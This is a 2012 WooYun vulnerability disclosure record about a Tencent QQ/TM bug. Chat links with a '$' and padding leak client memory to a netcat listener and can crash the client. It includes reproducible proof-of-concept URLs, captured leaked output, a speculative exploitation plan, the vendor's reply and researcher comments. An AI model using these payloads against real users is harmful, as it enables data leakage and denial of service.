{"id": 21107, "wybug_id": "wooyun-2012-05420", "wybug_title": "腾讯 QQ、TM 远程读取内存数据漏洞、可导致远程溢出、拒绝服务攻击", "wybug_corp": "腾讯", "wybug_author": "核攻击", "wybug_date": "2012-03-20 21:00", "wybug_open_date": "2012-03-21 09:17", "wybug_type": "设计错误/逻辑缺陷", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-03-20：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2012-03-21：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 腾讯 QQ、TM 远程读取内存数据漏洞、可导致远程溢出、拒绝服务攻击 腾讯 QQ、TM 聊天窗口远程读取对方进程内存数据漏洞、可导致远程溢出、拒绝服务攻击 漏洞描述： 这个我也不知道该下个什么定义、叫个什么名字好，暂且叫这个名字吧…… 这个漏洞挺狗血的，发现过程也很巧合。 话说本站部分连接被伟大的GFW屏蔽了，所以在早上的时候，我把链接统一改成了一个很猥琐的格式…… 例如：http://lcx.cc/?$=1910，（因为存在一些兼容问题，现在已经改成其他的了……） 然后，下午的时候，在群里发了链接，然后紧接着很多人反映QQ崩溃、或是无法访问！如下图： 详细说明：  腾讯 QQ、TM 远程读取内存数据漏洞、可导致远程溢出、拒绝服务攻击 腾讯 QQ、TM 聊天窗口远程读取对方进程内存数据漏洞、可导致远程溢出、拒绝服务攻击 漏洞描述： 这个我也不知道该下个什么定义、叫个什么名字好，暂且叫这个名字吧…… 这个漏洞挺狗血的，发现过程也很巧合。 话说本站部分连接被伟大的GFW屏蔽了，所以在早上的时候，我把链接统一改成了一个很猥琐的格式…… 例如：http://lcx.cc/?$=1910，（因为存在一些兼容问题，现在已经改成其他的了……） 然后，下午的时候，在群里发了链接，然后紧接着很多人反映QQ崩溃、或是无法访问！如下图： \n\n然后我很好奇，于是乎手动检查了下，发现了个奇怪的问题，如下图： \n\n很明显，打开的 Url 地址完全错误！并且后边多了一串奇怪的字符…… 这顿时勾起了我的兴趣，于是乎把玩了一番，得出了如下结论…… 漏洞测试： 测试环境：TM2009 Beta3.2 + IE9 + Windows 7 旗舰版 32 位 实际上后来得出来的结论与测试环境没什么联系，完全是 QQ、TM 软件内部数据处理问题，QQ 以及 TM 均可以利用成功，更有一些版本的QQ直接崩溃！！ 下边说测试方法，准备工具：准备企鹅（QQ号）两头，NC 或其他能做临时 Web 服务器的东西…… 执行：nc -l -p 80，你懂的…… 然后打开两个聊天窗口，使用其中一个发送以下字符串： http://192.168.1.2/$0000 然后再另一个接收的聊天窗口打开该 Url（其实双方窗口都可以打开该地址，都会触发漏洞） \n\n你会惊奇的发现： GET /root@lcx.cc%3E HTTP/1.1Accept: text/html, application/xhtml+xml, */*Accept-Language: zh-CNUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)Accept-Encoding: gzip, deflateHost: 192.168.1.2Connection: Keep-Alive \n\nUrl 地址居然变成了：http://192.168.1.2/root@lcx.cc%3E，Holy, Shit! 后边的：root@lcx.cc> 是神吗？？？？（后来得出结论，这是对方的QQ号……） 不明白中，好吧，继续测试： http://192.168.1.2/$1，返回结果： GET /para%E8%A3%9C%E2%88%A5 HTTP/1.1Accept: text/html, application/xhtml+xml, */*Accept-Language: zh-CNUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)Accept-Encoding: gzip, deflateHost: 192.168.1.2Connection: Keep-Alive para%E8%A3%9C%E2%88%A5 这又是个啥？？好吧，继续： http://192.168.1.2/$000000000000000000000000000000000000000000000000000000000000000000000000000000000000 返回： GET /7620ACE1-9C90-4E6A-9571-FE57A6A6DE69%3E HTTP/1.1Accept: text/html, application/xhtml+xml, */*Accept-Language: zh-CNUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)Accept-Encoding: gzip, deflateHost: 192.168.1.2Connection: Keep-Alive 7620ACE1-9C90-4E6A-9571-FE57A6A6DE69>，Yoooooooooooooooooooooo~ What The Fuck! 继续： http://192.168.1.2/$000 http://192.168.1.2/$=000 http://192.168.1.2/$=00 返回： \n\n哦呵呵呵呵呵呵，目测企鹅已经内部混乱了，我们继续，屌不炸，誓不罢休，哈哈哈哈…… http://192.168.1.2/$1111111100000000，返回：/link%3E，Url 解码为：/link>，是不是有点像Html标签？而且貌似还是超链接标签？继续…… http://192.168.1.2/$%E5%B1%8C%E7%82%B8%EF%BC%81，返回： \n\nplatform:CF_Only_Open_Safe_URL，越来越接近真相了哦，亲~ http://192.168.1.2/$%01%02%03%04%04%05%06%07%08%08%08%08%08%08%08%08%08%08%08%08%08%08 GET /%DF%8FPYD%DF%8F/hL%DF%8F%E7%8C%80%E7%90%80T%DF%8F%E6%A0%80%E6%BC%80/%DF%8F%E4%8C%80%E7%94%80d%DF%8F%E6%A0%80%E6%A4%80l%DF%8F%E7%8C%80%E6%94%80t%DF%8F%E2%BC%80%EF%BF%BD%7C%DF%8F%0Cs%C2%84%DF%8FTi%C2%8C%DF%8F HTTP/1.1Accept: text/html, application/xhtml+xml, */*Accept-Language: zh-CNUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)Accept-Encoding: gzip, deflateHost: 192.168.1.2Connection: Keep-Alive 这次企鹅射了好大一段哦，是什么呢，稍后解释，继续蹂躏企鹅…… http://192.168.1.2/$0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 猜猜返回了什么？Look： http://192.168.1.2/tr%20bkIndex=1%20bgColor=#fbfafa%20id=itemId_32%20onclick=SetCurSel(this)%20ondblclick%20='OnDbClickItem(this)'%20dCount=0><td><table%20cellspacing='0'%20cellpadding='0'><tr><td%20width='183'><object%20classid='clsid:87AF538B-F052-4A0B-BAE0-E686AD921119'%20class=imgHead><param%20name='src'%20value='platformdata:Head\\1.png'></object>306797777</td><td%20width='183'>306797777<td>2012/3/11%2010:47:52</td></tr></table></td></tr> Url 解码后： http://192.168.1.2/tr bkIndex=1 bgColor=#fbfafa id=itemId_32 onclick=SetCurSel(this) ondblclick ='OnDbClickItem(this)' dCount=0><td><table cellspacing='0' cellpadding='0'><tr><td width='183'><object classid='clsid:87AF538B-F052-4A0B-BAE0-E686AD921119' class=imgHead><param name='src' value='platformdata:Head\\1.png'></object>306797777</td><td width='183'>306797777<td>2012/3/11 10:47:52</td></tr></table></td></tr> 哈哈哈哈哈，企鹅聊天框的原始 Html 代码！！！（企鹅的聊天框是 Html 构架的） 企鹅快爆了，继续…… http://192.168.1.2/$11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111 \n\nhttp://192.168.1.2/$8888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888880 返回： http://192.168.1.2/items%3E%3Citem%20title=%22一个月未登录%22%20tips=%22该分组中一个月未登录好友%22%20value=%2231%22%20/%3E%3Citem%20title=%22三个月未登录%22%20tips=%22该分组中三个月未登录好友%22%20value=%2291%22%20/%3E%3Citem%20title=%22半年未登录%22%20tips=%22该分组中半年未登录好友%22%20value=%22184%22%20/%3E%3C/items%3E??? Url 解码后： items><item title=\"一个月未登录\" tips=\"该分组中一个月未登录好友\" value=\"31\" /><item title=\"三个月未登录\" tips=\"该分组中三个月未登录好友\" value=\"91\" /><item title=\"半年未登录\" tips=\"该分组中半年未登录好友\" value=\"184\" /></items>??? 呵呵，这是神马数据？？？ 返回数据： http://192.168.1.2//A%3E%3C/font%3E%3Cfont%20style=%22font-size:20pt;font-family:'微软雅黑','MS%20Sans%20Serif',sans-serif;%22%20color='800040'%3E%3Cbr%3E%3Cbr%3E打开该链接……%3C/font%3E Url 解码后： http://192.168.1.2//A></font><font style=\"font-size:20pt;font-family:'微软雅黑','MS Sans Serif',sans-serif;\" color='800040'><br><br>打开该链接……</font> 哈哈哈哈，腾讯打开连接那个框框的 Html 源码…… 呵呵，更卧槽的是，随后，企鹅华丽的一声爆了，哦也…… \n\n重启QQ后，再次执行 2048 字节的数字 8： GET /Canvas%3E%3Cbackground%3E%3CTexture%20colorize=%22true%22%20file=%22com.tencent.qzoneres:Qzone_TipFrame_QzoneTipBack_clientBkg.png%22%20drawMode=%229Grid%22/%3E%3C/background%3E%3CTexture%20file=%22com.tencent.qzoneres:Qzone_TipFrame_QzoneTipBack_clientBkg_hightlight.png%22%20Canvas.autoHeight=%22true%22%20Canvas.autoWidth=%22true%22%20Canvas.anchor=%22RIGHTCENTER%22%20Canvas.margin=%220,0,-5,-13%22/%3E%3C/Canvas%3E HTTP/1.1Accept: text/html, application/xhtml+xml, */*Accept-Language: zh-CNUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)Accept-Encoding: gzip, deflateHost: 192.168.1.2Connection: Keep-Alive \n\n /Canvas><background><Texture colorize=\"true\" file=\"com.tencent.qzoneres:Qzone_TipFrame_QzoneTipBack_clientBkg.png\" drawMode=\"9Grid\"/></background><Texture file=\"com.tencent.qzoneres:Qzone_TipFrame_QzoneTipBack_clientBkg_hightlight.png\" Canvas.autoHeight=\"true\" Canvas.autoWidth=\"true\" Canvas.anchor=\"RIGHTCENTER\" Canvas.margin=\"0,0,-5,-13\"/></Canvas> 呵呵，腾讯内存泄露了…… 不测试了，以此类推，很多的…… 漏洞成因： 本人不是逆向狂牛，所以具体原因不明中…… 但是，目测是腾讯在打开URL的时候，处理字符串问题，在碰到特殊符号“$”（美元符号）的时候，会产生计算错误，具体怎么产生的，目前不得而知。 但是结果可以知道，字符串长度计算错误，导致取数据的时候内存“错位”，把一块不相干的内存读取出来，并组成 Url，然后调用默认浏览器打开…… 于是乎，就产生了这个蛋疼的漏洞，由于错误的内存读取操作很危险，所以很容易崩溃…… 然后你就可以远程拒绝服务了…… 可惜的是，该漏洞读取的内存位置，貌似不可控，反正很难定位，但是有部分字符串却是固定的读取位置。 测试的时候，有时候是对方昵称、QQ，有时候是聊天记录，有时候是群里某个QQ号，有时候是乱码（某个内存位置的无意义数据）…… 在测试中，貌似只有这一个特殊符号生效，其他特殊符号均正常。 在该符号后边可以跟任何数据，随便什么，反正是填充位置的，让腾讯计算错误，越大越好，目测以数字为佳，字母或其他字符有时候无效。 利用方案： 可以远程读取对方进程内存，你只需要架一个简易Web服务器，能监听80端口即可，随便什么东西都行…… 目前只能乱读一气，期待逆向大牛，如果可以精确控制读取位置，那么读取对方内存中的密匙指日可待了，你懂的…… 而且本漏洞，貌似可以覆盖部分内存，所以，可能导致远程溢出…… 就这样了，Fuck Gov……    漏洞证明：  卧槽，实在是太长了，尼玛复制还不带自动复制图片的，靠……这是链接：http://lcx.cc/?i=2349晕   修复方案：  腾讯自有方案……   版权声明：转载请注明来源 核攻击@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2012-03-21 09:17 厂商回复： 您好，该漏洞先前已处理过，并已修复，请升级至最新版，谢谢您的反馈！PS：此问题并不是溢出漏洞，只是在处理特殊字符时存在bug。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2012-03-20 21:19 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  尼玛 木有图，编辑累死了    \n     2012-03-20 21:26 |    \t\tshine  \t\t\t( 普通白帽子  |\t\t\t        Rank:831 漏洞数:77        | coder)\t\t \n  洞主的签名好性感！    \n     2012-03-20 21:26 |    \t\tEoh \t\t\t( 普通白帽子  |\t\t\t        Rank:286 漏洞数:35        )\t\t \n  Nuclear'Atk大牛 来这里刷Rank？话说你电磁风暴 v3.0能不能来拿测试下，淫荡到，360弱爆了。    \n     2012-03-20 21:28 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @Eoh 洞主弱爆了啊 一个博客慢得要死    \n     2012-03-20 21:32 |    \t\tEoh \t\t\t( 普通白帽子  |\t\t\t        Rank:286 漏洞数:35        )\t\t \n  @xsser 肯定是你D他的拉。xsser邪恶到……    \n     2012-03-20 22:21 |    \t\tZ-0ne  \t\t\t( 普通白帽子  |\t\t\t        Rank:559 漏洞数:38        | 目前专注于工控安全基础研究，工业数据采集...)\t\t \n  特地来膜拜大牛    \n     2012-03-20 22:26 |    \t\tshine  \t\t\t( 普通白帽子  |\t\t\t        Rank:831 漏洞数:77        | coder)\t\t \n  测试通过！环境XP+NC+TM2009 Beta3.2  ,暂时个人认为，由于版本原因，对QQ用户影响不大，TM到是蛮严重的！    \n     2012-03-20 22:31 |    \t\tshine  \t\t\t( 普通白帽子  |\t\t\t        Rank:831 漏洞数:77        | coder)\t\t \n  @shine 哦！环境部分还要+IE6    \n     2012-03-20 22:48 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  哇哈，已阅。支持一个    \n     2012-03-20 22:49 |    \t\tValo洛洛 \t\t\t( 普通白帽子  |\t\t\t        Rank:458 漏洞数:52        | 。)\t\t \n  原来http://t00ls.net/ 是你们干的啊。。    \n     2012-03-20 23:09 |    \t\tshine  \t\t\t( 普通白帽子  |\t\t\t        Rank:831 漏洞数:77        | coder)\t\t \n  今天各方面都心情愉快！明天有时间给中国移动发个昨天发现的暴露问题超级大礼包！    \n     2012-03-20 23:11 |    \t\t灰太狼 \t\t\t( 实习白帽子  |\t\t\t        Rank:69 漏洞数:8        | 宁愿保持沉默让人看起来像个傻子，也不要一...)\t\t \n  忽略吧。。    \n     2012-03-20 23:18 |    \t\t天行健 \t\t\t( 路人 |\t\t\t        Rank:20 漏洞数:3        | 业余信息安全爱好者，没事了玩一玩)\t\t \n  xp下QQ2011不存在问题，洞主所说的是哪个版本呢？    \n     2012-03-20 23:33 |    \t\tCplusHua \t\t\t( 普通白帽子  |\t\t\t        Rank:238 漏洞数:33        | 乌云奖金:-1)\t\t \n  @xsser 看他博客的图片地址，是采集的百度图片 应该是中转的 直接打开后面的地址就快了。    \n     2012-03-20 23:50 |    \t\tpestu \t\t\t( 普通白帽子  |\t\t\t        Rank:170 漏洞数:13        | 关注计算机网络安全 lnmpa技术)\t\t \n  牛B    \n     2012-03-21 01:33 |    \t\tRookie \t\t\t( 普通白帽子  |\t\t\t        Rank:288 漏洞数:78        | 123)\t\t \n  抢个位    \n     2012-03-21 09:19 |    \t\triusksk \t\t\t( 实习白帽子  |\t\t\t        Rank:38 漏洞数:8        )\t\t \n  楼主居然使用TM2009进行测试，现在都2012了，测试也下个最新版测试下吗？    \n     2012-03-21 09:42 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @灰太狼 预言帝    \n     2012-03-21 09:50 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @riusksk tm2011也有效    \n     2012-03-21 10:37 |    \t\t一刀终情 \t\t\t( 普通白帽子  |\t\t\t        Rank:156 漏洞数:28        | ‮‮PKAV技术宅社区-安全爱好者)\t\t \n  神奇的东东，能利用的话，太邪恶了；我要是发现这个邪恶的东西，估计都不舍得发出来了@@    \n     2012-03-21 10:44 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @一刀终情 没有洞主伟大啊 洞主思路也值得学习    \n     2012-03-21 10:47 |    \t\triusksk \t\t\t( 实习白帽子  |\t\t\t        Rank:38 漏洞数:8        )\t\t \n  @xsser TM已经没维护了    \n     2012-03-21 10:53 |    \t\t一刀终情 \t\t\t( 普通白帽子  |\t\t\t        Rank:156 漏洞数:28        | ‮‮PKAV技术宅社区-安全爱好者)\t\t \n  @xsser 是的，向洞主学习~~测试思路、方法也很好~~    \n     2014-11-11 20:28 |    \t\tRainShine \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:4        )\t\t \n  哦~呵~呵~呵呵呵~标准核总语气，哇嘎嘎    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}